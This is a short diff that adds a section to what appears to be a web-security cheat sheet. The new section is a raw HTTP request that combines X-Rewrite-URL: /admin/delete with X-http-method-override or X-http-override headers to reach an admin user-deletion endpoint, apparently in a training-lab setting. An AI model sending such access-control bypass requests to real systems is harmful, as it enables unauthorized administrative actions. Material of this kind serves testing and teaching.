@@ -84,3 +84,12 @@ GET /?username=carlos HTTP/1.1
 Host: example.com
 X-Rewrite-URL: /admin/delete
 ```
+### X-http-method-override / X-http-overrid
+```
+POST /?username=carlos HTTP/1.1
+Host: example.com
+X-Rewrite-URL: /admin/delete
+X-http-method-override: GET
+Or
+X-http-override: GET
+```
